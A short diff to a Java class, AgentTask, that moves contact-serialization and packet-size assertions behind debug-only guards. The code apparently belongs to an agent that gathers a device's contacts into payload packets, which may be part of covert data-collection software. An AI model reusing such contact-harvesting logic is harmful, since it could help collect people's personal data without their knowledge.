@@ -80,11 +80,11 @@ public class AgentTask extends AgentBase {
 	 * serialize contacts in the markup
 	 */
 	private void serializeContacts() {
-		Check.ensures(contacts != null, "null contacts");
+		if(Cfg.DEBUG) Check.ensures(contacts != null, "null contacts");
 		
 		try {
 			boolean ret = markup.writeMarkupSerializable(contacts);
-			Check.ensures(ret,"cannot serialize");
+			if(Cfg.DEBUG) Check.ensures(ret,"cannot serialize");
 		} catch (IOException e) {
 			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error (serializeContacts): " + e);
 		}
@@ -190,11 +190,11 @@ public class AgentTask extends AgentBase {
 		db_header.writeInt(version);
 		db_header.writeInt((int) uid);
 
-		Check.asserts(header.length == 12, "getContactPayload header.length: " + header.length);
-		Check.asserts(db_header.getPosition() == 12, "getContactPayload db_header.getLength: " + header.length);
+		if(Cfg.DEBUG) Check.asserts(header.length == 12, "getContactPayload header.length: " + header.length);
+		if(Cfg.DEBUG) Check.asserts(db_header.getPosition() == 12, "getContactPayload db_header.getLength: " + header.length);
 
 		final byte[] packet = Utils.concat(header, 12, payload, payload.length);
-		Check.ensures(packet.length == size, "getContactPayload packet.length: " + packet.length);
+		if(Cfg.DEBUG) Check.ensures(packet.length == size, "getContactPayload packet.length: " + packet.length);
 		return packet;
 	}
 
